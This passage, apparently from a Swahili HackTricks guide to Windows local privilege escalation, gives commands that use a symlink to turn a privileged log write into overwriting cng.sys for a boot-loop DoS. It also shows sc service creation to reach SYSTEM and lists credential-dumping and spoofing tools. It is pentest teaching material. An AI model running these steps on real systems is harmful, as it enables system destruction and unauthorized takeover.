- Operesheni yenye haki za juu inayoandika kwenye njia hiyo (log, export, report).

**Mfuatano wa mfano**
1. Soma config ili kupata mahali pa privileged log, kwa mfano `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` ndani ya `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Elekeza upya njia hiyo bila admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Subiri kipengele chenye privileges kiandike log (kwa mfano, admin aanzishe "send test SMS"). Sasa data itaandikwa kwenye `C:\Windows\System32\cng.sys`.
4. Kagua target iliyoandikwa upya (hex/PE parser) ili kuthibitisha uharibifu; kuwasha upya kunalazimisha Windows kupakia njia ya driver iliyoharibiwa → **boot loop DoS**. Hii pia inatumika kwa faili yoyote iliyolindwa ambayo service yenye privileges itafungua kwa ajili ya kuandika.

> `cng.sys` kwa kawaida hupakiwa kutoka `C:\Windows\System32\drivers\cng.sys`, lakini ikiwa nakala ipo kwenye `C:\Windows\System32\cng.sys`, inaweza kujaribiwa kwanza, na kuifanya kuwa sehemu ya kuaminika ya kuelekeza data iliyoharibiwa na kusababisha DoS.



## **Kutoka High Integrity hadi System**

### **Service mpya**

Ikiwa tayari unaendesha mchakato wa High Integrity, **njia ya kufikia SYSTEM** inaweza kuwa rahisi: **unda na utekeleze service mpya**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Unapotengeneza binary ya service, hakikisha ni service halali au binary inatekeleza hatua zinazohitajika haraka, kwa sababu itazimwa baada ya sekunde 20 ikiwa si service halali.

### AlwaysInstallElevated

Kutoka kwa process ya High Integrity unaweza kujaribu **kuwezesha registry entries za AlwaysInstallElevated** na **kusakinisha** reverse shell kwa kutumia wrapper ya _**.msi**_.\
[Maelezo zaidi kuhusu registry keys husika na jinsi ya kusakinisha kifurushi cha _.msi_ hapa.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Unaweza** [**kupata code hapa**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ikiwa una token privileges hizo (huenda utazipata katika process ya High Integrity ambayo tayari ipo), utaweza **kufungua karibu process yoyote** (isipokuwa protected processes) kwa kutumia privilege ya SeDebug, **kunakili token** ya process hiyo, na kuunda **process yoyote kwa kutumia token hiyo**.\
Kwa kawaida, mbinu hii **huchagua process yoyote inayoendeshwa kama SYSTEM yenye token privileges zote** (_ndiyo, unaweza kupata process za SYSTEM zisizo na token privileges zote_).\
**Unaweza kupata** [**mfano wa code inayotekeleza mbinu iliyopendekezwa hapa**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Mbinu hii hutumiwa na meterpreter kufanya escalation kupitia `getsystem`. Mbinu hii inahusisha **kuunda pipe na kisha kuunda/ kutumia vibaya service ili iandike kwenye pipe hiyo**. Kisha, **server** iliyounda pipe kwa kutumia privilege ya **`SeImpersonate`** itaweza **kuiga token** ya mteja wa pipe (service), na kupata privileges za SYSTEM.\
Ikiwa unataka [**kujifunza zaidi kuhusu name pipes, soma hili**](#named-pipe-client-impersonation).\
Ikiwa unataka kusoma mfano wa [**jinsi ya kutoka High Integrity hadi System kwa kutumia name pipes, soma hili**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ukifaulu **kuteka dll** inayopakiwa na **process** inayoendeshwa kama **SYSTEM**, utaweza kutekeleza code yoyote kwa kutumia permissions hizo. Kwa hiyo, Dll Hijacking pia ni muhimu kwa aina hii ya privilege escalation. Zaidi ya hayo, ni rahisi zaidi **kuitekeleza kutoka kwa process ya High Integrity**, kwa kuwa itakuwa na **write permissions** kwenye folda zinazotumiwa kupakia dlls.\
**Unaweza** [**kujifunza zaidi kuhusu Dll hijacking hapa**](dll-hijacking/index.html)**.**

### **Kutoka Administrator au Network Service hadi System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Kutoka LOCAL SERVICE au NETWORK SERVICE hadi full privs

**Soma:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Msaada zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Zana muhimu

**Zana bora ya kutafuta njia za Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Hukagua misconfigurations na faili nyeti (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Imedetectiwa.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Hukagua baadhi ya misconfigurations zinazowezekana na kukusanya taarifa (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Hukagua misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Hutoa taarifa zilizohifadhiwa za sessions za PuTTY, WinSCP, SuperPuTTY, FileZilla, na RDP. Tumia -Thorough kwenye mfumo wa ndani.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Hutoa credentials kutoka Credential Manager. Imedetectiwa.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Hujaribu passwords zilizokusanywa kwenye domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ni zana ya PowerShell ya ADIDNS/LLMNR/mDNS spoofing na man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc enumeration ya Windows**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Hutafuta vulnerabilities zinazojulikana za privesc (IMEPITWA NA WAKATI; tumia Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Ukaguzi wa ndani **(Unahitaji haki za Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Hutafuta vulnerabilities zinazojulikana za privesc (inahitaji ku-compiliwa kwa kutumia VisualStudio) ([**iliyocompiliwa mapema**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Hukagua host kutafuta misconfigurations (ni zaidi ya zana ya kukusanya taarifa kuliko ya privesc) (inahitaji ku-compiliwa) **(**[**iliyocompiliwa mapema**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Hutoa credentials kutoka kwenye programu nyingi (exe iliyocompiliwa mapema ipo kwenye github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port ya PowerUp kwenda C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Hukagua misconfiguration (executable iliyocompiliwa mapema ipo kwenye github). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Hukagua misconfigurations zinazowezekana (exe kutoka python). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Zana iliyoundwa kwa msingi wa chapisho hili (haihitaji accesschk ili kufanya kazi vizuri, lakini inaweza kuitumia).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Husoma matokeo ya **systeminfo** na kupendekeza exploits zinazofanya kazi (python ya ndani)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Husoma matokeo ya **systeminfo** na kupendekeza exploits zinazofanya kazi (Python ya ndani)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Unahitaji ku-compili mradi kwa kutumia toleo sahihi la .NET ([tazama hili](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Ili kuona toleo la .NET lililosakinishwa kwenye host ya mwathiriwa, unaweza kufanya hivi:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Misingi ya Windows Privilege Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Kuongeza privileges kwa kutumia vibaya ruhusa dhaifu za folda](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - cheat sheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Warsha ya Windows / Linux Local Privilege Escalation](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Mashambulizi ya Windows: AT ndiyo mtindo mpya (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Mwongozo kamili wa OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Mwongozo wa Windows Privilege Escalation](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Orodha ya ukaguzi ya Windows-Privilege-Escalation](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Mbinu za Windows Privilege Escalation kwa Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Ulaghai wa phishing kupitia SMTP kwa kutumia macro ya Word VBA → kusimbua credentials za hMailServer → Veeam CVE-2023-27532 hadi SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) na wizi wa kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Kumfuatilia Silver Fox: Paka na Panya katika Vivuli vya Kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Udhaifu wa privileged file system katika mfumo wa SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Zana za kupima Symbolic Link – Matumizi ya CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Kiungo cha Zamani. Kutumia vibaya Symbolic Links kwenye Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (toleo la Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Utafutaji hatari wa modules kwenye Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modules: kupakia kutoka kwenye folda za `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Changamoto za orodha ya ukaguzi ya C/C++, zimetatuliwa](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Kazi ya RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own na Microslop: Kuunganisha CLDFLT na hali za mbio za DirectX Kernel kwa Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [I/O Ring Moja ya Kuwatawala Wote: Primitive kamili ya kusoma/kuandika kwenye Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Kutumia vibaya ufutaji wa faili kiholela ili kuongeza privileges na hila nyingine nzuri](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Msimbo wa exploit wa FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Mashambulizi ya WSUS Sehemu ya 2: CVE-2020-1013, Windows 10 Local Privilege Escalation ya siku ya kwanza](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Kuchunguza Credential Manager na Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: Mabadiliko ya picha yanaposababisha Privilege Escalation](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Kutoa funguo za Ssh za faragha kutoka kwa Windows 10 Ssh Agent](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Kubadilisha seva za masasisho za kampuni kuwa viwanda vya backdoor (0_o) – Sehemu ya 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Kubadilisha seva za masasisho za kampuni kuwa viwanda vya backdoor (0_o) – Sehemu ya 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Privilege Escalation kupitia ufutaji wa folda ya Microsoft Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: Kufuatilia hatua zako hadi NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
{{#include ../../banners/hacktricks-training.md}}
